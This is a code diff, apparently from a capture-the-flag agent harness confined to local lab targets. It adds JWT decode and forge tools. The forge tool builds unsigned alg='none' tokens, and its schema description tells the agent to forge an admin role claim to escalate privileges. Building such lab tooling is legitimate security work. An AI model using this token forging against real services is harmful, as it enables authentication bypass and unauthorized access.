@@ -7,6 +7,8 @@ erro. Isso mantem o agente confinado ao laboratorio (alvos locais).
 
 from __future__ import annotations
 
+import base64
+import json
 import re
 from dataclasses import dataclass, field
 from urllib.parse import urlparse
@@ -14,6 +16,14 @@ from urllib.parse import urlparse
 import requests
 
 FLAG_RE = re.compile(r"flag\{[^}]{1,200}\}", re.I)
+
+
+def _b64url(raw: bytes) -> str:
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+
+def _b64url_dec(seg: str) -> bytes:
+    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))
 
 
 @dataclass
@@ -91,6 +101,32 @@ def submit_flag(ctx: ToolContext, flag: str = "") -> dict:
     return {"ok": True, "message": "flag registrada"}
 
 
+def jwt_decode(ctx: ToolContext, token: str = "") -> dict:
+    """Decodifica um JWT (sem verificar assinatura) e mostra header + payload."""
+    parts = (token or "").split(".")
+    if len(parts) < 2:
+        return {"error": "nao parece um JWT (espera 3 partes separadas por ponto)"}
+    try:
+        header = json.loads(_b64url_dec(parts[0]))
+        payload = json.loads(_b64url_dec(parts[1]))
+    except (ValueError, json.JSONDecodeError) as exc:
+        return {"error": f"falha ao decodificar: {exc}"}
+    return {"header": header, "payload": payload}
+
+
+def jwt_forge(ctx: ToolContext, payload: dict | None = None, alg: str = "none") -> dict:
+    """Forja um JWT com o payload dado. Por padrao alg='none' (sem assinatura),
+    util contra verificadores que aceitam tokens nao assinados."""
+    if not isinstance(payload, dict) or not payload:
+        return {"error": "informe 'payload' como objeto, ex: {'user':'admin','role':'admin'}"}
+    header = {"alg": alg, "typ": "JWT"}
+    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
+    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
+    sig = ""  # alg=none -> assinatura vazia
+    token = f"{h}.{p}.{sig}"
+    return {"token": token, "uso": "envie em header Authorization: Bearer <token>"}
+
+
 # Esquemas no formato function-calling (compativel com Ollama/OpenAI).
 TOOL_SCHEMAS = [
     {
@@ -123,6 +159,44 @@ TOOL_SCHEMAS = [
     {
         "type": "function",
         "function": {
+            "name": "jwt_decode",
+            "description": (
+                "Decodifica um token JWT (sem verificar assinatura) e mostra o "
+                "header e o payload. Use para inspecionar um token recebido e "
+                "descobrir os campos (ex: role)."
+            ),
+            "parameters": {
+                "type": "object",
+                "properties": {"token": {"type": "string", "description": "o JWT (x.y.z)"}},
+                "required": ["token"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "jwt_forge",
+            "description": (
+                "Forja um JWT com o payload que voce escolher, usando alg='none' "
+                "(sem assinatura). Util quando o servidor aceita tokens nao "
+                "assinados: forje {'role':'admin'} e use-o para escalar privilegio."
+            ),
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "payload": {
+                        "type": "object",
+                        "description": "claims do token, ex: {'user':'admin','role':'admin'}",
+                    },
+                    "alg": {"type": "string", "description": "algoritmo; use 'none'"},
+                },
+                "required": ["payload"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
             "name": "submit_flag",
             "description": "Submete a flag (formato flag{...}) para encerrar o desafio.",
             "parameters": {
@@ -137,13 +211,20 @@ TOOL_SCHEMAS = [
 # Quais argumentos cada ferramenta aceita (filtra kwargs inesperados do modelo).
 _ALLOWED_ARGS = {
     "http_request": {"method", "url", "data", "headers"},
+    "jwt_decode": {"token"},
+    "jwt_forge": {"payload", "alg"},
     "submit_flag": {"flag"},
 }
 
 
 def dispatch(ctx: ToolContext, name: str, args: dict) -> dict:
     """Executa a ferramenta pelo nome, filtrando argumentos validos."""
-    fns = {"http_request": http_request, "submit_flag": submit_flag}
+    fns = {
+        "http_request": http_request,
+        "jwt_decode": jwt_decode,
+        "jwt_forge": jwt_forge,
+        "submit_flag": submit_flag,
+    }
     fn = fns.get(name)
     if fn is None:
         return {"error": f"ferramenta desconhecida: {name}"}
